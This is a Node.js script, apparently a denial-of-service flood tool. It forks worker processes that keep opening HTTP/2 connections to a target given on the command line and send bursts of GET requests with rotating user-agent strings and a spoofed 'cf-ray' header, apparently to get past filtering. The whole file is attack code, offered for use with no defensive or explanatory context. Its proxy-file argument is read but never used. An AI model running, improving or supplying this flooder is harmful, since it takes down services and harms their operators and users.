const http2 = require('http2');
const cluster = require('cluster');
const fs = require('fs');

const [,, target, port, duration, rate, threads, proxyFile] = process.argv;

const uaPool = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
  "Mozilla/5.0 (X11; Linux x86_64)...",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64)...",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)...",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1)...",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0)...",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)..."
];

if (cluster.isPrimary) {
  for (let i = 0; i < parseInt(threads); i++) cluster.fork();
  setTimeout(() => process.exit(1), duration * 1000);
} else {
  const proxies = fs.readFileSync(proxyFile, "utf-8").trim().split("\n");

  function flood() {
    const client = http2.connect(target, { rejectUnauthorized: false });
    for (let i = 0; i < rate; i++) {
      const ua = uaPool[Math.floor(Math.random() * uaPool.length)];
      const req = client.request({
        ":method": "GET",
        ":path": "/",
        "user-agent": ua,
        "cf-ray": Math.random().toString(36).substring(7)
      });
      req.on("response", () => req.close());
      req.end();
    }
    client.close();
    setImmediate(flood);
  }

  flood();
}